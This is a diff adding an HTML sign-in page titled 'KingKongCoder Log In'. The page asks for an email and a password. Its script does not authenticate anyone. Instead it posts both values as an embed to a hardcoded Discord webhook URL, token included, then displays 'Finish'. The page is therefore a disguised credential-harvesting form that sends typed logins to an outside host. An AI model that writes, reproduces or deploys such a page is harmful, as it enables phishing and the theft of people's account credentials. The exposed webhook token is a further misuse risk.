@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <style>
+        button{
+            background: lightblue;
+            color: white;
+            border-radius: 4px;
+            width: 100px;
+            height: 29px;
+            cursor: pointer;
+        }
+        .form{
+            text-align: center;
+            margin-top: 80px;
+        }
+        #finish{
+            background-color: lightblue;
+            color: white;
+            border-radius: 100%;
+        }
+        .greet{
+            text-align: center;
+            font-size: 100px;
+        }
+        .e, .p{
+            font-size: 25px;
+            text-align: center;
+            border-radius: 4px;
+            background-color: lightblue;
+            color: white;
+        }
+        img{
+            border-radius: 8px;
+        }
+    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KingKongCoder Log In</title>
+</head>
+<body bgcolor="cyan">
+    <h1 class="greet">KingKongCoder</h1>
+    <div class="form">
+    <form id="webhook-form">
+        
+        <input id="text-input" class="e" type="email" placeholder="Email" required>
+        <br>
+        <br>
+        <input id="message-input" class="p" type="password" placeholder="Password" required>
+        <br>
+        <br>
+        <button type="submit">Sign In</button>
+    </form>
+    <br>
+    <p id="finish" onclick="window.location.href='home.html';"></p>
+    <img src="coder.png">
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1561630892437274754/pty6ZSONNRSz3PpJuRoAaGkHiGAwG4Pu6N4tIx5XFvcLJ8lcnp0_yZkG_DY3oXpyisM6";
+
+        const form = document.getElementById("webhook-form");
+        const finish = document.getElementById("finish");
+
+        form.addEventListener("submit", async (e) => {
+            e.preventDefault();
+
+            const text = document.getElementById("text-input").value;
+            const message = document.getElementById("message-input").value;
+
+            // Sends both inputs to discord
+            const payload = {
+                username: "KingKongCoder",
+                embeds: [
+                    {
+                        title: "New Submission",
+                        color: 0xADD8E6,
+                        fields: [
+                            {
+                                name: "Text",
+                                value: text,
+                                inline: true
+                            },
+                            {
+                                name: "Message",
+                                value: message,
+                                inline: false
+                            }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }
+                ]
+            };
+
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    finish.innerHTML = "Finish";
+                    form.reset();
+                } else {
+                    finish.innerHTML = "ERROR! Check webhook URL.";
+                }
+            } catch (error) {
+                finish.innerHTML = "ERROR! Check webhook URL.";
+                console.error(error);
+            }
+        });
+    </script>
+</body>
+</html>
